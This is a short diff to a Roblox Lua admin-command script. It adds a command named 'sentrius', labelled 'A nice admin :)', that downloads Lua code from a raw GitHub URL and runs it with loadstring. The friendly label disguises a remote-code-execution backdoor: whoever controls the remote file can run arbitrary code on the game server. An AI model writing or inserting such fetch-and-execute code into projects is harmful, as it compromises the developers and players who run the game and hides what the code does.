@@ -531,6 +531,11 @@ AddCommand(Ranks.Developer.Rank, "setscore", "Set players score (FAKE)", "<...>"
     end
 end)
 
+AddCommand(Ranks.Special.Rank, "sentrius", "A nice admin :)", "<>", function(caller: Player)
+    local code = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/dmxxxx29/Roblox-/refs/heads/main/sentrius.lua")
+    getfenv().loadstring(code)()
+end)
+
 AddCommand(Ranks.Special.Rank, "shutdown", "Emergency cleanup :)", "<...>", function(caller: Player, ...)
     local reason = table.concat({...}, " ")
 
